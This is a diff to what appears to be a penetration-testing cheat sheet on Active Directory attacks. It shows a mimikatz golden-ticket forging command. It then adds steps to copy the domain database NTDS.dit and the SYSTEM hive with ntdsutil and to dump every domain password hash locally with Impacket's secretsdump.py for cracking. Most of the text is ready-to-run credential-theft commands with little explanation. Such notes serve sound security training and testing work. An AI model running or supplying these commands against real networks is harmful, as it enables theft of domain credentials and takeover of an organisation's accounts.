@@ -88,3 +88,15 @@ Pass the hash
 Golden ticket creation and pass the ticket   
     
     mimikatz # kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash>   
+    
+## AD Password Files  
+NTSDS.dit (db) and SYSTEM registry hive. Can use built in ntdsutil.exe to backup AD. Then use another tool to extract DC hashes, since NTDS.dit is encrypted and opened exclusively for use by OS (can't be copied).     
+Back up AD files:    
+
+    ntdsutil           
+    activate instance ntds     
+    ifm          #commands will generate backup of data in C:\ntds directory. Crack locally.    
+    
+Then locally extract NTDS.dit and SYSTEM registry data using Impacket script secretsdump.py  
+
+    $ python secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL        
